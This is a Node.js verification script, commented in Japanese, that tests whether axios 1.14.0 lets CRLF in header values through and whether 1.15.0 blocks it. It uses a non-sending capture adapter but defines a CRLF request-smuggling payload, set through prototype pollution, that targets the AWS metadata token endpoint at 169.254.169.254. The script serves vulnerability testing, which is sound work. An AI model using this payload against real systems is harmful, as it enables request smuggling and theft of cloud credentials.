/**
 * CVE-2026-40175 検証スクリプト
 *
 * カスタムアダプターを使い、Node.js の http モジュールを介さず
 * axios 自身のヘッダーバリデーション層だけを検証する。
 *
 * - axios@1.14.0（脆弱）: CRLF がバリデーションされずアダプターに到達する
 * - axios@1.15.0（修正済み）: assertValidHeaderValue が CRLF を検出し、
 *   アダプター呼び出し前にエラーを投げる
 *
 * 実行方法:
 *   # v1.14.0 で実行（脆弱 → CRLF が素通り）
 *   docker compose run --rm victim node safe.js
 *
 *   # v1.15.0 にアップグレードして実行（修正済み → エラーが出る）
 *   docker compose run --rm victim sh -c "npm install axios@1.15.0 && node safe.js"
 */

const axios = require('axios');
const installedVersion = require('axios/package.json').version;

console.log(`=== CVE-2026-40175 検証 (axios@${installedVersion}) ===\n`);

// ============================================================
// カスタムアダプター
// 実際の HTTP 送信をスキップし、axios が組み立てたヘッダーを返すだけ。
// Node.js の http モジュールの CRLF バリデーションを完全に回避する。
// ============================================================
const captureAdapter = (config) => {
  return Promise.resolve({
    data: { capturedHeaders: config.headers },
    status: 200,
    statusText: 'OK',
    headers: {},
    config,
    request: {},
  });
};

const client = axios.create({ adapter: captureAdapter });

// ============================================================
// Step 1: プロトタイプ汚染（exploit.js と同じ攻撃の前提）
// ============================================================
const CRLF_PAYLOAD =
  'dummy\r\n\r\n' +
  'PUT /latest/api/token HTTP/1.1\r\n' +
  'Host: 169.254.169.254\r\n' +
  'X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n' +
  '\r\n';

Object.prototype['x-inject'] = CRLF_PAYLOAD;

console.log('[1] プロトタイプ汚染を実行');
console.log('    Object.prototype["x-inject"] に CRLF 密輸ペイロードをセット\n');

async function main() {
  // ============================================================
  // テスト①: プロトタイプ汚染だけでヘッダーが混入するか？
  // axios は内部で Object.keys() を使うため、プロトタイプを辿らない。
  // → v1.14.0 でもこの経路では汚染値は混入しない。
  // ============================================================
  console.log('[2] プロトタイプ汚染状態で通常リクエスト（ヘッダー明示なし）...');
  try {
    const res = await client.get('http://169.254.169.254/latest/meta-data/');
    const headers = res.data.capturedHeaders;
    // プロトタイプチェーンを辿らず own property かどうかで判定する。
    // headers['x-inject'] は Object.prototype 経由でも値が返るため誤検知になる。
    const leaked = Object.prototype.hasOwnProperty.call(headers, 'x-inject');
    if (leaked) {
      console.log('    ⚠️  プロトタイプ汚染値が axios のヘッダーに own property として混入！');
      console.log('    x-inject:', JSON.stringify(String(headers['x-inject'])).slice(0, 60) + '...');
    } else {
      console.log('    プロトタイプ汚染値はヘッダーに混入しなかった');
      console.log('    （axios は Object.keys() でヘッダーを処理するため、プロトタイプを辿らない）');
    }
  } catch (e) {
    console.log('    エラー:', e.message);
  }
  console.log();

  // ============================================================
  // テスト②: CRLF を含むヘッダーを axios に直接渡す
  // ★ これが CVE-2026-40175 の本質的なテスト ★
  //
  // v1.14.0: normalizeValue が末尾の \r\n しか除去しないため
  //          CRLF がアダプターまで素通りする → 脆弱
  //
  // v1.15.0: assertValidHeaderValue が \r\n を検出して即エラー
  //          → アダプターへ到達しない → 修正済み
  // ============================================================
  console.log('[3] ★ CVE 検証: CRLF を含むヘッダーを axios に直接渡す...');
  try {
    const res = await client.get('http://169.254.169.254/latest/meta-data/', {
      headers: { 'x-inject': CRLF_PAYLOAD },
    });

    // アダプターに到達した = CRLF がバリデーションをすり抜けた
    const sentValue = res.data.capturedHeaders['x-inject'];
    console.log(`\n    ⚠️  [axios@${installedVersion}] CRLF がバリデーションされずにアダプターに到達！`);
    console.log('    実際に送信されようとしたヘッダー値:');
    console.log('    ' + JSON.stringify(String(sentValue)));
    console.log('\n    → このバージョンは CVE-2026-40175 に対して脆弱です。');
    console.log('    → 実際の HTTP 送信では CRLF でリクエストが分裂し、');
    console.log('       密輸された PUT /latest/api/token が IMDS に届きます。');
    console.log('\n    修正を確認するには:');
    console.log('    docker compose run --rm victim sh -c "npm install axios@1.15.0 && node safe.js"');
  } catch (e) {
    if (e.message && e.message.includes('Invalid character in header content')) {
      console.log(`\n    ✅ [axios@${installedVersion}] ブロックされました: ${e.message}`);
      console.log('    → assertValidHeaderValue が CRLF を検出し、アダプターへ到達する前にエラーを投げた！');
      console.log('    → CVE-2026-40175 に対して修正済みです。');
    } else {
      console.log('    予期しないエラー:', e.message);
    }
  }
}

main();
